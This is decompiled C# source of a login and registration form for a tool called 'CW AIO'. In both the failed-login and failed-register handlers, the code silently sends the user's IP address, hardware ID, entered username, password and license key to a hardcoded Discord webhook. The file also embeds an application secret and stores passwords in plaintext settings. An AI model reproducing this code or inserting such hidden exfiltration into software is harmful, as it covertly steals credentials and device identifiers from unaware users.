using System;
using System.ComponentModel;
using System.Drawing;
using System.Windows.Forms;
using RAW.Auth;
using RAW.LogTools;
using RAW.Properties;
using RAW.Tool;
using Siticone.Desktop.UI.WinForms;
using Siticone.UI.WinForms;

namespace FAZEDAuth
{
	// Token: 0x02000016 RID: 22
	public partial class LoginMenu : Form
	{
		// Token: 0x060000B3 RID: 179 RVA: 0x00004CA6 File Offset: 0x00004CA6
		public LoginMenu()
		{
			this.InitializeComponent();
			LoginMenu.King.init();
		}

		// Token: 0x060000B4 RID: 180 RVA: 0x00004CC0 File Offset: 0x00004CC0
		private void LoginMenu_Load(object sender, EventArgs e)
		{
			if (Settings.Default.Username != string.Empty)
			{
				this.LoginUser.Text = Settings.Default.Username;
				this.SaveChkbx.Checked = true;
			}
			if (Settings.Default.Password != string.Empty)
			{
				this.LoginPass.Text = Settings.Default.Password;
				this.SaveChkbx.Checked = true;
			}
		}

		// Token: 0x060000B5 RID: 181 RVA: 0x00004D3C File Offset: 0x00004D3C
		private void SaveChkbx_CheckedChanged(object sender)
		{
			if (this.SaveChkbx.Checked)
			{
				Settings.Default.Username = this.LoginUser.Text;
				Settings.Default.Password = this.LoginPass.Text;
				Settings.Default.Save();
			}
			if (!this.SaveChkbx.Checked)
			{
				Settings.Default.Username = "";
				Settings.Default.Password = "";
				Settings.Default.Save();
			}
		}

		// Token: 0x060000B6 RID: 182 RVA: 0x00004DC0 File Offset: 0x00004DC0
		private void button1_Click(object sender, EventArgs e)
		{
			if (LoginMenu.King.login(this.LoginUser.Text, this.LoginPass.Text))
			{
				Settings.Default.Username = this.LoginUser.Text;
				Settings.Default.Password = this.LoginPass.Text;
				Settings.Default.Save();
				Form form = new MainForm();
				base.Hide();
				form.ShowDialog();
				base.Close();
				return;
			}
			using (DcWebHook dcWebHook = new DcWebHook())
			{
				dcWebHook.UserName = "Frenzy Services [ALERT]";
				dcWebHook.WebHook = "https://discord.com/api/webhooks/992268123359158292/FtI8m6yJU9czEqaIs1zie-QSqlU_defAlR6oNVl6arkbhHre9a4ASNH-w8plrf0DYoOV";
				dcWebHook.SendMessage(string.Concat(new string[]
				{
					"** <@901534172621979691> **",
					Environment.NewLine,
					"```css",
					Environment.NewLine,
					"[ALERT | CW AIO FAILED LOGIN]",
					Environment.NewLine,
					"IP | ",
					IP.Grab(),
					Environment.NewLine,
					"HWID | ",
					HWID.Grab(),
					Environment.NewLine,
					Environment.NewLine,
					"Username | ",
					this.LoginUser.Text,
					Environment.NewLine,
					"Password | ",
					this.LoginPass.Text,
					Environment.NewLine,
					"```"
				}));
			}
		}

		// Token: 0x060000B7 RID: 183 RVA: 0x00004F3C File Offset: 0x00004F3C
		private void RegisterLbl_Click(object sender, EventArgs e)
		{
			if (LoginMenu.King.register(this.RegisterUser.Text, this.RegisterPass.Text, this.RegisterKey.Text))
			{
				this.LoginPanel.Visible = true;
				this.RegisterPanel.Visible = false;
				this.GlobalBtn.Checked = false;
				this.HomeBtn.Checked = true;
				return;
			}
			using (DcWebHook dcWebHook = new DcWebHook())
			{
				dcWebHook.UserName = "Frenzy Services [ALERT]";
				dcWebHook.WebHook = "https://discord.com/api/webhooks/992268123359158292/FtI8m6yJU9czEqaIs1zie-QSqlU_defAlR6oNVl6arkbhHre9a4ASNH-w8plrf0DYoOV";
				dcWebHook.SendMessage(string.Concat(new string[]
				{
					"** <@901534172621979691> **",
					Environment.NewLine,
					"```css",
					Environment.NewLine,
					"[ALERT | CW AIO FAILED REGISTER]",
					Environment.NewLine,
					"IP | ",
					IP.Grab(),
					Environment.NewLine,
					"HWID | ",
					HWID.Grab(),
					Environment.NewLine,
					Environment.NewLine,
					"Username | ",
					this.RegisterUser.Text,
					Environment.NewLine,
					"Password | ",
					this.RegisterPass.Text,
					Environment.NewLine,
					"Key | ",
					this.RegisterKey.Text,
					Environment.NewLine,
					"```"
				}));
			}
		}

		// Token: 0x060000B8 RID: 184 RVA: 0x000050D8 File Offset: 0x000050D8
		private void Fade_Tick(object sender, EventArgs e)
		{
			if (base.Opacity == 1.0)
			{
				this.Fade.Stop();
			}
			base.Opacity += 0.2;
		}

		// Token: 0x060000B9 RID: 185 RVA: 0x0000510C File Offset: 0x0000510C
		private void HomeBtn_Click(object sender, EventArgs e)
		{
			this.LoginPanel.Visible = true;
			this.RegisterPanel.Visible = false;
		}

		// Token: 0x060000BA RID: 186 RVA: 0x00005126 File Offset: 0x00005126
		private void GlobalBtn_Click(object sender, EventArgs e)
		{
			this.LoginPanel.Visible = false;
			this.RegisterPanel.Visible = true;
		}

		// Token: 0x060000BB RID: 187 RVA: 0x00005140 File Offset: 0x00005140
		private void LoginPanel_Paint(object sender, PaintEventArgs e)
		{
		}

		// Token: 0x0400006F RID: 111
		private static string name = "CW AIO";

		// Token: 0x04000070 RID: 112
		private static string ownerid = "zjT0wdUQ9G";

		// Token: 0x04000071 RID: 113
		private static string secret = "7be69524bb0ec35e8bdac379eb2f47ffc4d5d102b37f4c3138f7199a940b0066";

		// Token: 0x04000072 RID: 114
		private static string version = "2.0";

		// Token: 0x04000073 RID: 115
		public static api King = new api(LoginMenu.name, LoginMenu.ownerid, LoginMenu.secret, LoginMenu.version);
	}
}
